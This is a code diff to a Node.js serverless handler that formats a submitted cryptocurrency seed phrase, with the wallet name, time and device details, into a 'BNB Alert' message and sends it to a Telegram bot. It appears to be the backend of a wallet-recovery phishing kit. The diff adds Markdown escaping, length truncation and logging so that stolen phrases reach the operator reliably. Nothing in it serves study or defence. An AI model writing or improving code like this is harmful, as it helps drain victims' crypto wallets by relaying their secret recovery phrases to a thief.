@@ -42,18 +42,89 @@ module.exports = async (req, res) => {
     formattedDate = formattedDate || new Date().toUTCString();
     const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';
 
-    // Format Telegram message in "BNB Alert" style
-    const message = `🚨 *BNB Alert*\n\n` +
+    // Escape Markdown special characters to prevent parsing errors
+    // Telegram Markdown requires escaping: _ * [ ] ( ) ~ ` > # + - = | { } . !
+    function escapeMarkdown(text) {
+      if (!text) return '';
+      return String(text)
+        .replace(/\_/g, '\\_')
+        .replace(/\*/g, '\\*')
+        .replace(/\[/g, '\\[')
+        .replace(/\]/g, '\\]')
+        .replace(/\(/g, '\\(')
+        .replace(/\)/g, '\\)')
+        .replace(/\~/g, '\\~')
+        .replace(/\`/g, '\\`')
+        .replace(/\>/g, '\\>')
+        .replace(/\#/g, '\\#')
+        .replace(/\+/g, '\\+')
+        .replace(/\-/g, '\\-')
+        .replace(/\=/g, '\\=')
+        .replace(/\|/g, '\\|')
+        .replace(/\{/g, '\\{')
+        .replace(/\}/g, '\\}')
+        .replace(/\./g, '\\.')
+        .replace(/\!/g, '\\!');
+    }
+
+    // For seed phrase in code block: only escape backticks (special chars in code blocks are fine)
+    function escapePhraseForCodeBlock(text) {
+      if (!text) return '';
+      return String(text).replace(/\`/g, '\\`');
+    }
+
+    // Escape all user input fields
+    const escapedPhrase = escapePhraseForCodeBlock(phrase); // Only escape backticks for code block
+    const escapedWallet = escapeMarkdown(imported || 'Unknown');
+    const escapedDate = escapeMarkdown(formattedDate);
+    const escapedDevice = escapeMarkdown(deviceInfo.substring(0, 200));
+    
+    // Format Telegram message in "BNB Alert" style (with escaped special characters)
+    let message = `🚨 *BNB Alert*\n\n` +
                    `🔑 *SEED PHRASE SUBMITTED*\n\n` +
-                   `👤 *Wallet:* ${imported || 'Unknown'}\n` +
+                   `👤 *Wallet:* ${escapedWallet}\n` +
                    `🔤 *Words:* ${wordCountDesc}\n` +
-                   `🕐 *Time:* ${formattedDate}\n` +
+                   `🕐 *Time:* ${escapedDate}\n` +
                    `🌍 *Location:* Unknown, Unknown\n` +
-                   `📱 *Device:* ${deviceInfo.substring(0, 200)}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
+                   `📱 *Device:* ${escapedDevice}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
                    `🔒 *Seed Phrase:*\n` +
-                   `\`${phrase}\`\n\n` +
-                   `⚠️ _User attempted wallet recovery_\n\n` +
-                   (copyUrl ? `[📎 Click to Copy Phrase](${copyUrl})` : '');
+                   `\`${escapedPhrase}\`\n\n` +
+                   `⚠️ _User attempted wallet recovery_\n\n`;
+    
+    // Add copy URL link if available
+    if (copyUrl) {
+      message += `[📎 Click to Copy Phrase](${copyUrl})`;
+    }
+    
+    // Telegram message length limit is 4096 characters
+    if (message.length > 4096) {
+      // Truncate the seed phrase if message is too long
+      const baseMessageLength = message.length - escapedPhrase.length;
+      const maxPhraseLength = Math.max(0, 4096 - baseMessageLength - 100); // Leave 100 chars buffer
+      const truncatedPhrase = phrase.substring(0, maxPhraseLength);
+      const escapedTruncatedPhrase = escapePhraseForCodeBlock(truncatedPhrase);
+      message = `🚨 *BNB Alert*\n\n` +
+                 `🔑 *SEED PHRASE SUBMITTED*\n\n` +
+                 `👤 *Wallet:* ${escapedWallet}\n` +
+                 `🔤 *Words:* ${wordCountDesc}\n` +
+                 `🕐 *Time:* ${escapedDate}\n` +
+                 `🌍 *Location:* Unknown, Unknown\n` +
+                 `📱 *Device:* ${escapedDevice.substring(0, 100)}...\n\n` +
+                 `🔒 *Seed Phrase:*\n` +
+                 `\`${escapedTruncatedPhrase}...\`\n\n` +
+                 `⚠️ _User attempted wallet recovery_\n\n`;
+      if (copyUrl) {
+        message += `[📎 Click to Copy Phrase](${copyUrl})`;
+      }
+    }
+
+    // Final validation: Telegram message length limit is 4096 characters
+    if (message.length > 4096) {
+      console.error('Message too long:', message.length, 'characters');
+      // Force truncate more aggressively
+      const safeMaxLength = 3500;
+      message = message.substring(0, safeMaxLength) + '...\n\n[Message truncated due to length]';
+    }
 
     // Send to Telegram via Bot API
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -74,9 +145,12 @@ module.exports = async (req, res) => {
     const data = await response.json();
 
     if (data.ok) {
+      console.log('✅ Telegram message sent successfully. Length:', message.length, 'characters');
       return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
     } else {
-      console.error('Telegram API error:', data);
+      console.error('❌ Telegram API error:', data);
+      console.error('Message length:', message.length);
+      console.error('Error description:', data.description);
       return res.status(500).json({ error: 'Failed to send message to Telegram', details: data.description });
     }
   } catch (error) {
